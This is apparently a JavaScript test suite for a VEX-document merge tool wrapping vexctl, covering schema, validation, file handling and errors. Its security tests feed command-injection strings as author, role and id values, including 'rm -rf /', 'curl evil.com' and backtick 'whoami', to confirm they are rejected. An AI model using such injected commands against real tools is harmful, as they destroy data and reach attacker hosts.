import { describe, it } from "node:test";
import { strict as assert } from "assert";
import { 
  assertValidToolResponse,
  testData
} from "../test-helpers.js";

// Import the vex-merge tool functions
import { mergeVexDocumentsTool, handleMergeVexDocuments } from "../../src/tools/vex-merge.js";

describe("VEX Merge Tool", () => {
  describe("Tool Definition", () => {
    it("should have correct tool definition structure", () => {
      const tool = mergeVexDocumentsTool;
      
      assert.strictEqual(tool.name, "merge_vex_documents");
      assert.strictEqual(tool.description.includes("VEX"), true);
      assert.strictEqual(tool.description.includes("merge"), true);
      assert(tool.inputSchema, "Tool should have input schema");
      assert(tool.inputSchema.properties, "Input schema should have properties");
      
      // Check required properties
      const requiredProps = ["documents"];
      requiredProps.forEach(prop => {
        assert(tool.inputSchema.properties[prop], `Should have ${prop} property`);
      });
    });

    it("should have proper schema constraints", () => {
      const tool = mergeVexDocumentsTool;
      const documentsProperty = tool.inputSchema.properties.documents;
      
      assert(documentsProperty.type === "array", "Documents should be array type");
      assert(documentsProperty.minItems === 2, "Should require at least 2 documents");
      assert(documentsProperty.maxItems === 20, "Should limit to maximum 20 documents");
      assert(documentsProperty.items, "Array items should have schema");
    });

    it("should have optional filter properties", () => {
      const tool = mergeVexDocumentsTool;
      const properties = tool.inputSchema.properties;
      
      assert(properties.products, "Should have products filter property");
      assert(properties.vulnerabilities, "Should have vulnerabilities filter property");
      assert(properties.author, "Should have author property");
      assert(properties.author_role, "Should have author_role property");
      assert(properties.id, "Should have id property");
    });
  });

  describe("Input Validation", () => {
    it("should accept valid merge request with minimum documents", async () => {
      const response = await handleMergeVexDocuments(testData.validMergeRequest);
      
      assertValidToolResponse(response);
      // Note: May fail with vexctl error if not available, but should not crash
    });

    it("should reject missing documents parameter", async () => {
      const invalidRequest = { 
        author: "test-author"
      };
      
      const response = await handleMergeVexDocuments(invalidRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("At least 2 VEX documents are required"));
    });

    it("should reject single document", async () => {
      const invalidRequest = {
        documents: [testData.validVexDocument]
      };
      
      const response = await handleMergeVexDocuments(invalidRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("At least 2 VEX documents are required"));
    });

    it("should reject too many documents", async () => {
      const manyDocuments = Array(21).fill(testData.validVexDocument);
      const invalidRequest = {
        documents: manyDocuments
      };
      
      const response = await handleMergeVexDocuments(invalidRequest);
      
      assert.strictEqual(response.isError, true);
      // Debug: Print actual error message
      console.log("Actual error:", response.content[0].text);
      assert(response.content[0].text.includes("Maximum of 20 documents") || 
             response.content[0].text.includes("Maximum"), 
      `Expected error about maximum documents, got: ${response.content[0].text}`);
    });

    it("should reject invalid document objects", async () => {
      const invalidRequest = {
        documents: [
          testData.validVexDocument,
          "not-an-object"
        ]
      };
      
      const response = await handleMergeVexDocuments(invalidRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("must be a valid JSON object"));
    });

    it("should reject documents without required VEX structure", async () => {
      const invalidRequest = {
        documents: [
          testData.validVexDocument,
          { "invalid": "document", "missing": "context_and_statements" }
        ]
      };
      
      const response = await handleMergeVexDocuments(invalidRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("must be a valid VEX document"));
    });

    it("should accept valid filter parameters", async () => {
      const requestWithFilters = {
        ...testData.validMergeRequest,
        products: ["pkg:npm/example@1.0.0"],
        vulnerabilities: ["CVE-2024-1234"],
        author: "security-team",
        author_role: "Security Engineer",
        id: "custom-merge-id-123"
      };
      
      const response = await handleMergeVexDocuments(requestWithFilters);
      
      assertValidToolResponse(response);
      // Note: May fail with vexctl error if not available, but should not crash
    });
  });

  describe("Security Features", () => {
    it("should prevent command injection in author parameter", async () => {
      const maliciousRequest = {
        ...testData.validMergeRequest,
        author: "author; rm -rf /"
      };
      
      const response = await handleMergeVexDocuments(maliciousRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("potentially dangerous characters"));
    });

    it("should prevent command injection in author_role parameter", async () => {
      const maliciousRequest = {
        ...testData.validMergeRequest,
        author_role: "role && curl evil.com"
      };
      
      const response = await handleMergeVexDocuments(maliciousRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("potentially dangerous characters"));
    });

    it("should prevent command injection in id parameter", async () => {
      const maliciousRequest = {
        ...testData.validMergeRequest,
        id: "id`whoami`"
      };
      
      const response = await handleMergeVexDocuments(maliciousRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("potentially dangerous characters"));
    });

    it("should handle extremely large document arrays", async () => {
      const largeDocument = {
        ...testData.validVexDocument,
        statements: Array(100).fill(testData.validVexDocument.statements[0])
      };
      
      const requestWithLargeDocuments = {
        documents: [testData.validVexDocument, largeDocument]
      };
      
      const response = await handleMergeVexDocuments(requestWithLargeDocuments);
      
      // Should handle gracefully, not crash
      assert(response, "Should handle large documents gracefully");
    });

    it("should sanitize product and vulnerability filters", async () => {
      const requestWithFilters = {
        ...testData.validMergeRequest,
        products: ["  pkg:npm/example@1.0.0  ", "", "  "],
        vulnerabilities: ["  CVE-2024-1234  ", "", "  "]
      };
      
      const response = await handleMergeVexDocuments(requestWithFilters);
      
      // Should sanitize and filter out empty strings
      assertValidToolResponse(response);
    });
  });

  describe("File Handling", () => {
    it("should handle temporary file creation and cleanup", async () => {
      const response = await handleMergeVexDocuments(testData.validMergeRequest);
      
      // Should return response (even if vexctl fails) and not leave temp files
      assert(response, "Should return response");
      assert(response.content, "Should have content in response");
    });

    it("should handle file write errors gracefully", async () => {
      // Test with documents that might cause write issues
      const requestWithProblematicData = {
        documents: [
          testData.validVexDocument,
          {
            ...testData.validVexDocument,
            "@id": "test://very-long-id-" + "x".repeat(1000)
          }
        ]
      };
      
      const response = await handleMergeVexDocuments(requestWithProblematicData);
      
      // Should handle gracefully
      assert(response, "Should handle file write issues gracefully");
    });
  });

  describe("vexctl Integration", () => {
    it("should handle vexctl command failures gracefully", async () => {
      // This will likely fail if vexctl is not available or has issues
      const response = await handleMergeVexDocuments(testData.validMergeRequest);
      
      // Should return error response, not crash
      assert(response, "Should return response even on vexctl failure");
      assert(response.content, "Should have content");
      
      if (response.isError) {
        assert(response.content[0].text, "Error response should have message");
      }
    });

    it("should timeout on long-running vexctl commands", async () => {
      // Test that timeout mechanism works
      const response = await handleMergeVexDocuments(testData.validMergeRequest);
      
      // Command should complete within timeout period or return error
      assert(response, "Should complete within timeout period");
    });

    it("should pass correct arguments to vexctl merge", async () => {
      const requestWithAllOptions = {
        ...testData.validMergeRequest,
        author: "test-author",
        author_role: "Engineer", 
        id: "test-merge-123",
        products: ["pkg:npm/test@1.0.0"],
        vulnerabilities: ["CVE-2024-1234"]
      };
      
      const response = await handleMergeVexDocuments(requestWithAllOptions);
      
      // Should attempt to call vexctl with all parameters
      assert(response, "Should handle all parameter options");
    });
  });

  describe("Output Format", () => {
    it("should return well-formed merge response", async () => {
      const response = await handleMergeVexDocuments(testData.validMergeRequest);
      
      assertValidToolResponse(response);
      
      if (response.content[0].type === "text") {
        const content = response.content[0].text;
        
        // Should contain merge-related content
        assert(content.includes("merge") || content.includes("VEX") || content.includes("Error"), 
          "Response should contain relevant content");
      }
    });

    it("should handle JSON parsing of vexctl output", async () => {
      // This tests the JSON parsing logic in the merge handler
      const response = await handleMergeVexDocuments(testData.validMergeRequest);
      
      assertValidToolResponse(response);
      
      // Should either parse JSON successfully or handle parsing errors gracefully
      assert(response.content[0].text, "Should have text content");
    });
  });

  describe("Error Handling", () => {
    it("should handle null/undefined inputs gracefully", async () => {
      const response = await handleMergeVexDocuments(null);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text, "Should provide error message for null input");
    });

    it("should handle empty object input", async () => {
      const response = await handleMergeVexDocuments({});
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("At least 2 VEX documents are required"));
    });

    it("should provide helpful error messages", async () => {
      const invalidRequest = {
        documents: ["not", "valid", "documents"]
      };
      
      const response = await handleMergeVexDocuments(invalidRequest);
      
      assert.strictEqual(response.isError, true);
      assert(response.content[0].text.includes("must be a valid JSON object"));
    });
  });
});
